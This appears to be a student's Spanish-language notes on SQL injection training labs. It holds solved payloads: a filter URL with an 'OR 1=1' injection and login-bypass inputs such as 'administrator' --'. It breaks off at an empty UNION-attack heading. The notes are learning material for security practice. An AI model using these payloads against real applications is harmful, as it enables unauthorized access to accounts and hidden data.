# SQL injection

## Índice
* [Retrieving hidden data]

  * Lab1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
* [Subverting application logic]
* Lab2. SQL injection vulnerability allowing login bypass
* [UNION attacks]
* [Examining the database]
* [Blind SQL injection]

## Retrieving hidden data

### Lab1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

![sql1.png](sql1.png)

```http
https://ac701fd11eeda548806db59400ab002f.web-security-academy.net/filter?category=Gifts' or 1 = 1 --
```

## Subverting application logic

### Lab2. SQL injection vulnerability allowing login bypass

![sql2.png](sql2.png)

#### 1 forma

username: `administrator' --`

password: `cualquier cosa por que este será interpretado como comentario pero requiere de algun texto para poder ser validado`

#### Otra forma sería:

username: `administrator' or 1 = 1 --` 

password: `'or 1 = 1 --`

## Retrieving data from other database tables

### SQL injection UNION attack, determining the number of columns returned by the query

